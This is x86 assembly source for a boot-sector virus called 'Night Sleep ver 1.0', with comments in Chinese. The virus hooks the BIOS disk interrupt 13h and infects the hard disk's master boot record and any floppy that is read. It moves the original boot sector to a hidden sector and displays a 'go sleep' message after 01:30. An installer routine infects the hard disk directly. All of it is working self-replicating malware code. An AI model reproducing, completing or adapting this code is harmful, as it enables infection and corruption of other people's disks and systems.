.286
.model small
.code

OFF equ <Offset>
VirusSize=OFF @@End-OFF @@Start

@@Start:
jmp short @@Begin
VirusFlag db 'V' 

@@BootData:
org 50h 

@@Begin: 
mov bx,7c00h
mov sp,bx 
sti
mov ax,ds:[413h]
dec ax
dec ax
mov ds:[413h],ax 
mov cl,06
shl ax,cl
mov es,ax
xor di,di
mov si,sp
mov cx,VirusSize
cld
rep movsb 
push ax
mov di,OFF @@HighAddr
push di
retf ;跳到高端继续执行

@@HighAddr:
cli ;修改中断向量前，最好关中断
xchg ds:[13h*4+2],ax
mov cs:[OldInt13Seg],ax
mov ax,OFF @@NewInt13
xchg ds:[13h*4],ax
mov cs:[OldInt13Off],ax ;修改中断13h
push ds
pop es ;把es复位为0
cmp dl,80h ;是否从硬盘引导？
jz short @@ReadOldHardBoot
push dx ; 从软盘引导，则传染硬盘
mov dl,80h
call @@OptDisk ;调用传染模块
pop dx

@@ReadOldFlopyBoot: ;读出原软盘引导程序
mov ax,0201h
mov cx,79*100h+17 ;传染时将原引导程序保存在0面79道17扇区中
mov dh,00h
call @@CallInt13
jc short @@ReadOldFlopyBoot ;失败，继续读直到成功

@@ExecOldBoot:
cmp es:[bx.Flags],0aa55h
jnz @@ExecOldBoot
mov ah,02h
int 1ah ;取系统时间
cmp cx,1*100h+30 ;是否大于01：30分
jb @@ExitDisp ;未到，则不显示
lea si,VirusMsg

@@DispMsg:
mov al,cs:[si]
inc si
mov ah,0eh
int 10h ;显示al中的字符
or al,al
jnz @@DispMsg
xor ax,ax
int 16h

@@ExitDisp:
mov cx,0001h ;恢复cx初值
push es
push bx
retf ;去执行原引导程序

@@ReadOldHardBoot:
mov ax,0201h
mov cx,0002h ;传染时将原硬盘主引导程序保存在0面0道2扇区中
mov dh,00h
call @@CallInt13 ;读出
jc short @@ReadOldHardBoot ;失败，继续读直到成功
jmp short @@ExecOldBoot ;去执行原引导程序

@@NewInt13: ;新Int 13h（传染块）
cmp dx,0000h ;是软盘吗？
jnz short @@JmpOldInt13
cmp ah,02h
jnz short @@JmpOldInt13
cmp cx,0001h
jnz short @@JmpOldInt13
call @@OptDisk ;若发现读软盘扇区，则感染软盘

@@JmpOldInt13:
cli
JmpFar db 0eah ;远跳转指令
OldInt13Off dw ?
OldInt13Seg dw ?

@@CallInt13:
pushf ;模拟Int 13h指令
push cs
call @@JmpOldInt13
ret

@@OptDisk: ;传染dl表示的磁盘（dl-0 A: 80:C)
pusha
push ds
push es ;保存段址与通用寄存器
push cs
pop es
push cs
pop ds ;使ds=es=cs
mov bx,OFF OldBootSpace
mov ax,0201h
mov cx,0001h
mov dh,00h
call @@CallInt13 ;读原引导扇区
jc short @@OptOver
mov di,bx
cmp ds:[di.VirusFlag],'V' ;判断是否已经有病毒？
jz short @@OptOver ;若有，则退出
cmp dl,00h
jz short @@IsOptFlopyDisk

@@IsOptHardDisk:
mov cx,0002h ;若是硬盘，保存在0面0道2扇区
jmp short @@SaveOldBoot

@@IsOptFlopyDisk:
mov cx,79*100h+17 ;若是软盘，保存在0面79道17扇区

@@SaveOldBoot:
mov ax,0301h
mov dh,0h
call @@CallInt13 ;保存原引导扇区
jc short @@OptOver
mov si,OFF @@Start
cld
movsw
movsb ;修改原扇区首指令（Jmp near 3字节）
mov di,OFF @@Begin+200h
mov si,OFF @@Begin
mov cx,OFF @@End-OFF @@Begin
cld
rep movsb ;修改原引导扇区指令cx字节
mov ax,0301h
mov cx,0001h
mov dh,00h
call @@CallInt13 ;写回已经被修改了的引导程序

@@OptOver: ;退出传染
pop es
pop ds ;恢复段址与通用寄存器
popa
ret ;以下是病毒要显示的信息，与病毒版本信息
VirusMsg db 0dh,0ah,07h,'Night is deep,you must go sleep!',0dh,0ah,0
db 'Night Sleep ver 1.0,by whg 2001.5.5',0

@@End:
org 1feh
Flags dw 0aa55h ;引导扇区有效标志
OldBootSpace db 210h dup(?) ;定义缓冲区

@@Install:
xor ax,ax
mov ds,ax
cli
mov ax,ds:[13h*4]
mov cs:[OldInt13Off],ax
mov ax,ds:[13h*4+2]
mov cs:[OldInt13Seg],ax
mov dl,80h
call @@OptDisk
mov ax,4c00h
int 21h
End @@Install